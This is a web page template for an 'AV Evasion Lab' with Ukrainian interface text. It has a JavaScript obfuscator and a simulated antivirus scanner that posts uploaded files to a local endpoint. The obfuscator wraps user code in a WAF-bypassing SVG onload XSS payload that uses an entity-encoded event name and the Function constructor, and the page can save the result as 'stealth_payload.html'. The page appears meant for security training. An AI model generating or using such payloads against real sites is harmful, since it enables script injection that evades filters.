{% extends 'base.html' %}

{% block content %}
<div style="max-width: 1000px; margin: 0 auto;">
    
    <div style="text-align: center; margin-bottom: 30px;">
        <h1 style="color: #9b59b6; margin-bottom: 10px;">üõ°Ô∏è AV Evasion Lab</h1>
        <p style="color: #7f8c8d;">–°–∏–º—É–ª—è—Ç–æ—Ä –æ–±—Ö–æ–¥—É WAF —Ç–∞ –∞–Ω—Ç–∏–≤—ñ—Ä—É—Å–Ω–∏—Ö —Å–∏–≥–Ω–∞—Ç—É—Ä.</p>
    </div>

    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px;">
        <div class="box" style="border-top: 5px solid #9b59b6;">
            <h3 style="color: #9b59b6; margin-top: 0;">üß† Obfuscator Payload</h3>
            <p style="font-size: 13px; color: #666;">–í–≤–µ–¥—ñ—Ç—å –∑–≤–∏—á–∞–π–Ω–∏–π JS –∫–æ–¥, —â–æ–± –ø—Ä–∏—Ö–æ–≤–∞—Ç–∏ –π–æ–≥–æ.</p>
            
            <textarea id="sourceCode" class="code-preview" style="height: 100px; background: #fff; color: #333; border: 2px solid #eee;" placeholder="alert('HACKED')"></textarea>
            
            <button class="btn btn-purple btn-full" onclick="obfuscate()">OBFUSCATE CODE ü™Ñ</button>
            
            <div style="margin-top: 20px;">
                <label style="font-weight: bold; font-size: 12px; color: #666;">RESULT (Bypass):</label>
                <textarea id="obfuscatedCode" class="code-preview" style="height: 100px;" readonly></textarea>
                <button class="btn btn-gray btn-full" onclick="downloadPayload()">üíæ SAVE .HTML</button>
            </div>
        </div>

        <div class="box" style="border-top: 5px solid #34495e;">
            <h3 style="color: #34495e; margin-top: 0;">üîç VirusTotal Simulator</h3>
            <p style="font-size: 13px; color: #666;">–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –¥–µ—Ç–µ–∫—Ç—É—î—Ç—å—Å—è –≤–∞—à —Ñ–∞–π–ª.</p>
            
            <div id="dropZone" style="border: 2px dashed #bdc3c7; padding: 40px; text-align: center; border-radius: 8px; cursor: pointer; transition: 0.3s; position: relative; overflow: hidden; background: #f9f9f9;">
                <div class="scan-line" id="scanLine" style="position: absolute; top:0; left:0; width:100%; height:4px; background:#e74c3c; box-shadow:0 0 10px red; display:none; animation: scan 1.5s infinite linear;"></div>
                <div style="font-size: 40px; color: #bdc3c7;">üìÇ</div>
                <div style="font-weight: bold; color: #7f8c8d; margin-top: 10px;">Drop file here</div>
                <input type="file" id="fileInput" style="display:none">
            </div>

            <div id="result-area" style="margin-top: 20px; padding: 15px; border-radius: 5px; text-align: center; display: none;"></div>
        </div>
    </div>
</div>

<style>
    @keyframes scan { 0% {top: 0;} 100% {top: 100%;} }
</style>

<script>
    // === 1. OBFUSCATOR ===
    function obfuscate() {
        let input = document.getElementById('sourceCode').value;
        if(!input) { alert('–í–≤–µ–¥—ñ—Ç—å –∫–æ–¥!'); return; }
        
        // Simple Unicode Obfuscation logic
        let unicodeString = "";
        for (let i = 0; i < input.length; i++) {
            unicodeString += "\\u" + input.charCodeAt(i).toString(16).padStart(4, '0');
        }
        let safeOnload = "on&#108;oad"; 
        let payload = `<svg/id="x" ${safeOnload}="[].sort.constructor('${unicodeString}')()">`;
        
        document.getElementById('obfuscatedCode').value = payload;
    }

    function downloadPayload() {
        let content = document.getElementById('obfuscatedCode').value;
        if(!content) { alert('–°–ø–æ—á–∞—Ç–∫—É —Å—Ç–≤–æ—Ä—ñ—Ç—å –∫–æ–¥!'); return; }
        let blob = new Blob([content], {type: "text/html"});
        let link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = "stealth_payload.html";
        link.click();
    }

    // === 2. SCANNER UI ===
    const dropZone = document.getElementById('dropZone');
    const fileInput = document.getElementById('fileInput');
    const scanLine = document.getElementById('scanLine');
    const resArea = document.getElementById('result-area');

    dropZone.addEventListener('click', () => fileInput.click());
    
    // Drag & Drop
    dropZone.addEventListener('dragover', (e) => { e.preventDefault(); dropZone.style.background = '#eef'; });
    dropZone.addEventListener('dragleave', () => { dropZone.style.background = '#f9f9f9'; });
    dropZone.addEventListener('drop', (e) => {
        e.preventDefault();
        dropZone.style.background = '#f9f9f9';
        if(e.dataTransfer.files.length) uploadAndScan(e.dataTransfer.files[0]);
    });

    fileInput.addEventListener('change', () => {
        if(fileInput.files.length) uploadAndScan(fileInput.files[0]);
    });

    async function uploadAndScan(file) {
        resArea.style.display = 'none';
        scanLine.style.display = 'block';
        dropZone.style.opacity = '0.6';
        
        const formData = new FormData();
        formData.append('file', file);

        await new Promise(r => setTimeout(r, 1000)); // Fake delay

        try {
            const response = await fetch('/scan_file', { method: 'POST', body: formData });
            const data = await response.json();
            
            resArea.style.display = 'block';
            resArea.innerHTML = `<strong>${data.message}</strong>`;
            
            if(data.status === 'blocked') {
                resArea.style.background = '#fadbd8';
                resArea.style.color = '#c0392b';
                resArea.style.border = '1px solid #e6b0aa';
            } else {
                resArea.style.background = '#d4efdf';
                resArea.style.color = '#1e8449';
                resArea.style.border = '1px solid #a9dfbf';
            }
        } catch(e) { alert('Error'); } 
        finally {
            scanLine.style.display = 'none';
            dropZone.style.opacity = '1';
            fileInput.value = '';
        }
    }
</script>
{% endblock %}